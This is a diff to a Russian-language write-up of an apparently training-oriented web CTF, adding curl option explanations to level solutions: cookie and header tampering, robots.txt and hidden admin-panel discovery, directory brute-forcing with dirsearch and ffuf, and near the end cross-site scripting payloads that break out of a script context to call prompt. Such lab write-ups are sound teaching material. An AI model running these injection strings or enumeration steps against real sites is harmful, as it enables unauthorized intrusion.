@@ -16,6 +16,10 @@ curl http://kslweb1.spb.ctf.su/first/level1
 curl -L -k http://kslweb1.spb.ctf.su/first/level2
 ```
 
+>  -k, --insecure    | Allow insecure server connections => также игнорит некоторые ошибки http
+
+> -L, --location     | Follow redirects => обращаться далее после перенаправлений
+
 ## таск 3
 
 ```bash
@@ -28,17 +32,25 @@ curl -L -k http://kslweb1.spb.ctf.su/first/level3
 curl -X POST -d "want_flag=YES" -d "code=1337" http://kslweb1.spb.ctf.su/first/level4/
 ```
 
+> -X, --request <method>    |  Specify request method to use
+
+>  -d, --data <data> | HTTP POST data , параметры, передаваемые в теле запроса POST
+
 ## таск 5
 
 ```bash
 curl -X POST -d "fun=Kaspersky%20%26%20Summer%20%26%20Lab" "http://kslweb1.spb.ctf.su/first/level5/"
 ```
 
+> --data-urlencode <data>  | HTTP POST data URL encoded , но проще руками энкодить, чтобы точно нужный формат
+
 ## таск 6
 
 ```bash
 curl -H "SPbCTF: Pretty cool" "http://kslweb1.spb.ctf.su/first/level6/"
 ```
+
+>  -H, --header < header/@file > | Pass custom header(s) to server
 
 ## таск 7
 
@@ -47,18 +59,33 @@ curl -H "SPbCTF: Pretty cool" "http://kslweb1.spb.ctf.su/first/level6/"
 curl -v -H "Cookie: $(printf 'a%03d=1;' {1..100})" "http://kslweb1.spb.ctf.su/first/level7/"
 ```
 
+> -v, --verbose | Make the operation more talkative => подробный вывод, проще понять что происходит
+
 ## таск 8 
+
 ```bash
 curl -i http://kslweb1.spb.ctf.su/first/level8/ 
 ``` 
 
+> -i, --show-headers | Show response headers in output
+
 ## таск 9
+
+Через `curl -i ...` видим 
+
+```http
+Set-Cookie: do_i_really_want_flag_for_level_nine=no; expires=...
+```
+
+следовательно прописываем куки через заголовки реквеста
+
 ```bash
 curl -H "Cookie: do_i_really_want_flag_for_level_nine=yes" "http://kslweb1.spb.ctf.su/first/level9/"
 ```
 
 ## таск 10
 
+Чекаем скрытые файлы и папки, криво настроенный обратный прокси на права чтения и листинг директорий
 ```bash
 curl http://kslweb1.spb.ctf.su/first/level10/robots.txt
 ```
@@ -67,6 +94,8 @@ curl http://kslweb1.spb.ctf.su/first/level10/hidden_admin_panel_WOW.php
 ```
 
 ## таск 11 
+
+Как в 10, но автоматизируя через dirsearch, dirb, ffuf, wfuzz, Burp intruder, Caido Automate
 
 ```bash
 dirsearch -u http://kslweb1.spb.ctf.su/first/level11/
@@ -108,6 +137,8 @@ function tryPassword() {
 ```bash
 curl http://kslweb1.spb.ctf.su/first//level14/index.php?give_flag=1 -o im.png
 ```
+
+>  -o, --output <file>  | Write to file instead of stdout
 
 ## таск 15 
 
@@ -414,7 +445,8 @@ JavaScript:prompt(`sibears`)
 
 ```html
 a}}}}}}}; prompt("sibears");//
-```
+``` 
+=>
 ```html
 <script>
 var a = "", b = "";
